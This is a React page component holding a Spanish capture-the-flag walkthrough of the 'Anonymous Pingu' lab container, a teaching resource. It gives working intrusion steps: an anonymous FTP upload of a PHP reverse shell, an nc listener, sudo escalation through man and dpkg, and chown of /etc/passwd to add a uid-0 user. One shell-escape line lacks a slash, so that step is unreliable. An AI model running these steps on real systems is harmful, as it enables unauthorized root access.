import CodeBash from "@/components/CodeBash";
import labs from "../labs";
import {
  DropdownMenu,
  DropdownMenuContent,
  DropdownMenuItem,
  DropdownMenuTrigger,
} from "@/components/ui/dropdown-menu";
import {
  Breadcrumb,
  BreadcrumbItem,
  BreadcrumbList,
  BreadcrumbPage,
  BreadcrumbSeparator,
} from "@/components/ui/breadcrumb";
import { ChevronDown, Slash } from "lucide-react";
import { Link } from "react-router-dom";
function AnonymousPingu() {
  const lastPath = location.pathname.split("/").filter(Boolean).pop();
  return (
    <div>
      <Breadcrumb>
        <BreadcrumbList>
          <BreadcrumbItem>
            <Link to="/">Home</Link>
          </BreadcrumbItem>
          <BreadcrumbSeparator>
            <Slash />
          </BreadcrumbSeparator>
          <BreadcrumbItem>
            <DropdownMenu>
              <DropdownMenuTrigger className="flex items-center gap-1">
                Docker Labs
                <ChevronDown className="h-4 w-4" />
              </DropdownMenuTrigger>
              <DropdownMenuContent align="start">
                {labs.map((lab) => (
                  <Link
                    to={
                      "/docker-labs/" + lab.toLowerCase().split(" ").join("-")
                    }
                  >
                    <DropdownMenuItem key={lab}>{lab}</DropdownMenuItem>
                  </Link>
                ))}
              </DropdownMenuContent>
            </DropdownMenu>
          </BreadcrumbItem>{" "}
          <BreadcrumbSeparator>
            <Slash />
          </BreadcrumbSeparator>
          <BreadcrumbItem>
            <BreadcrumbPage className="text-primary">
              {lastPath!.at(0)!.toUpperCase() +
                lastPath!.substring(1).split("-").join(" ")}
            </BreadcrumbPage>
          </BreadcrumbItem>
        </BreadcrumbList>
      </Breadcrumb>
      <div className="flex items-center flex-col">
        <h1 className="text-5xl mt-3 mb-5 font-bold">Anonymous Pingu</h1>
        <div className="md:px-48 w-full">
          <h2 className="my-2 text-3xl font-bold">
            Comenzamos inicializando la maquina
          </h2>
          <CodeBash text="sudo bash auto_deploy.sh anonymouspingu.tar" />
          <h2 className="mt-5  mb-2 text-3xl font-bold">Escaneo de puertos</h2>
          <p>Vamos a empezar el escaneo de puertos usando nmap</p>
          <CodeBash text="nmap -p- --open 172.17.0.2 -Pn" />
          <p>De resultado tenemos el puerto 80 y el 21 abiertos</p>
          <CodeBash
            text="PORT   STATE SERVICE
21/tcp open  ftp
80/tcp open  http"
          />
          <h2 className="mt-5  mb-2 text-3xl font-bold">
            Explorando el puerto 80
          </h2>
          <p>
            Al acceder a la pagina web podemos ver un apartado que dice:
            "Acceder al Backend, dentro tenemos una pagina llamada /upload/, se
            me ocurre poder subir algo mediante ftp
          </p>
          <h2 className="mt-5  mb-2 text-3xl font-bold">Rev Shell</h2>
          <p>
            Crearemos una REVERSE SHELL en la pagina{" "}
            <a href="https://www.revshells.com/">REVSHELL</a>. En este caso
            seleccione la de PentestMonkey, configuramos nuestra ip y el puerto
            a escuchar y copiamos el codigo a un archivo llamado rev.shell en
            nuestra maquina{" "}
          </p>
          <h2 className="mt-5  mb-2 text-3xl font-bold">Conexion por ftp</h2>
          <p>Usaremos el usuario anonymous que viene por defecto en ftp</p>
          <CodeBash text="lftp ftp://anonymous@172.17.0.2" />
          <p>
            Una vez dentro del ftp, exploraremos el entorno y pondremos en la
            carpeta upload nuestro revshell
          </p>
          <CodeBash
            text="lftp anonymous@172.17.0.2:~> ls
-rw-r--r--    1 0        0            7816 Nov 25  2019 about.html
-rw-r--r--    1 0        0            8102 Nov 25  2019 contact.html
drwxr-xr-x    2 0        0            4096 Jan 01  1970 css
drwxr-xr-x    2 0        0            4096 Apr 28 18:28 heustonn-html
drwxr-xr-x    2 0        0            4096 Oct 23  2019 images
-rw-r--r--    1 0        0           20162 Apr 28 18:32 index.html
drwxr-xr-x    2 0        0            4096 Oct 23  2019 js
-rw-r--r--    1 0        0            9808 Nov 25  2019 service.html
drwxrwxrwx    1 33       33           4096 Apr 28 21:08 upload
lftp anonymous@172.17.0.2:/> cd upload/
lftp anonymous@172.17.0.2:/upload> put rev.php
2586 bytes transferred
lftp anonymous@172.17.0.2:/upload>"
          />
          <h2 className="mt-5  mb-2 text-3xl font-bold">Conexion por netcat</h2>
          <p>
            Luego de esto vamos al enlace de la pagina web que dice "Acceder al
            Backend" y vemos que nuestro rev.shell ya esta en la carpeta
          </p>
          <p>
            Ponemos a netcat a escuchar el puerto 9001{" "}
            {"(fue el que especificamos en la configuracion de la revshell)"}
          </p>
          <CodeBash text="nc -lvnp 9001" />
          <p>
            Ahora abrimos el archivo rev.php desde la carpeta de apache y vemos
            que netcat logra la conexion con la maquina
          </p>
          <CodeBash
            text="$ whoami
www-data
$"
          />
          <h2 className="mt-5  mb-2 text-3xl font-bold">
            Escalado de Privilegios
          </h2>
          <p>Exploramos el entorno...</p>
          <CodeBash
            text="$ cd home
$ ls
gladys
pingu
ubuntu"
          />
          <p>
            Vemos que hay 2 usuarios, gladys y pingu, vemos que comandos podemos
            usar para seguir escalando
          </p>
          <CodeBash text="sudo -l" />
          <p>El resultado es el siguiente:</p>
          <CodeBash
            text="User www-data may run the following commands on 66f62de279ed:
    (pingu) NOPASSWD: /usr/bin/man"
          />
          <p>
            Entonces podemos usar man como pingu pero para esto tendremos que
            hacer tratamiento a la terminal
          </p>
          <h2 className="mt-5  mb-2 text-3xl font-bold">
            Tratamiento de la TTY
          </h2>
          <p>Para empezar abrimos una nueva instancia de bash con:</p>
          <CodeBash text="script /dev/null -c bash" />
          <p>
            Luego tenemos que suspender la shell, para esto presionamos ctrl+z
          </p>
          <CodeBash
            text="www-data@66f62de279ed:/home$ ^Z
zsh: suspended  nc -lvnp 9001"
          />
          <p>
            Ahora tenemos que resetear la configuracion de la shell con reset y
            xterm
          </p>
          <CodeBash text="stty raw -echo; fg" />
          <CodeBash
            text="[1]  + continued  nc -lvnp 9001
                               reset
reset: unknown terminal type unknown
Terminal type? xterm"
          />
          <p>
            Luego tenemos que exportar unas variables para tener la terminal
            totalmente interactiva
          </p>
          <CodeBash text="export TERM=xterm" />
          <CodeBash text="export SHELL=bash" />
          <p>Ahora si continuemos con el escalado</p>
          <h2 className="mt-5  mb-2 text-3xl font-bold">
            Escalado de Privilegios
          </h2>
          <p>
            Como vimos antes podemos usar man como pingu, asi que revisaremos su
            referencia en{" "}
            <a href="https://gtfobins.github.io/gtfobins/man/">GFOBINS</a>{" "}
          </p>
          <p>Para esto tenemos que usar el comando: </p>
          <CodeBash text="sudo -u pingu man man" />
          <p>
            Acontinuacion escribimos !/bin/sh al final de lo que nos aparecio,
            deberia quedar algo asi
          </p>
          <CodeBash
            text="DESCRIPTION
       man  is  the system's manual pager.  Each page argument giv
en to man is
       normally the name of a program, utility or function.  The  manual
 page
       associated with each of these arguments is then found and displayed.  A
       section,  if  provided, will direct man to look only in tha
!/bin/sh"
          />
          <p>Se nos abre una nueva terminal pero ahora somos pingu</p>
          <CodeBash
            text="$ whoami
pingu
$"
          />
          <h2 className="mt-5  mb-2 text-3xl font-bold">
            Escalado de Privilegios
          </h2>
          <p>
            Ahora revisamos los comandos que podemos usar para el escalado de
            privilegios
          </p>
          <CodeBash text="sudo -l" />
          <p>El resultado es el siguiente:</p>
          <CodeBash
            text="User pingu may run the following commands on 66f62de279ed:
    (gladys) NOPASSWD: /usr/bin/nmap
    (gladys) NOPASSWD: /usr/bin/dpkg"
          />
          <p>
            Podemos usar dpkg como gladys, revisamos la referencia en{" "}
            <a href="https://gtfobins.github.io/gtfobins/dpkg/">GFOBINS</a>{" "}
          </p>
          <CodeBash text="sudo -u gladys dpkg -l" />
          <p>
            Luego, igual que con pingu nos aprovechamos de less para abrir una
            shell como gladys usando:{" "}
          </p>
          <CodeBash text="!bin/sh" />
          <p>Y vemos que ya accedimos como gladys</p>
          <CodeBash
            text="$ whoami
gladys
$"
          />
          <p>Ahora volvemos a usar el comando</p>
          <CodeBash text="sudo -l" />
          <p>Vemos que podemos usar chown como root</p>
          <CodeBash
            text="User gladys may run the following commands on 66f62de279ed:
    (root) NOPASSWD: /usr/bin/chown"
          />
          <p>Cambiaremos el dueño de /etc/passwd con chown</p>
          <p>
            Para eso creamos la variable LFILE a la que asignaremos el path de
            las contraseñas
          </p>
          <CodeBash text="LFILE=/etc/passwd" />
          <p>Luego con chown modificaremos el propietario de el archivo </p>
          <CodeBash
            text="sudo chown $(id -un):$(id -gn) $LFILE
"
          />
          <p>
            Ahora el archivo de las contraseñas le pertenece a gladys, como no
            podemos usar un editor de texto en esa shell crearemos otro usuario
            con permisos de root escribiendo en /etc/passwd
          </p>
          <p>Creamos una contraseña encriptada con openssl</p>
          <CodeBash text="openssl passwd root1234" />
          <p>
            El resultado de esto es $1$hr3UZZZp$.0J6HxbqLtLB.7LI7oHjm/ con esto
            ponemos el nuevo usuario en /etc/passwd
          </p>
          <CodeBash text="echo 'newroot:$1$hr3UZZZp$.0J6HxbqLtLB.7LI7oHjm/:0:0::/home/newroot:/bin/bash' >> /etc/passwd" />
          <p>Nos conectamos a ese usuario con </p>
          <CodeBash text="su newroot" />
          <p>Ponemos la contraseña y guala, somos root</p>
          <CodeBash
            text="gladys@e6b8276176bb:/$ su newroot
Password:
root@e6b8276176bb:/# whoami
root"
          />
        </div>
      </div>
    </div>
  );
}

export default AnonymousPingu;
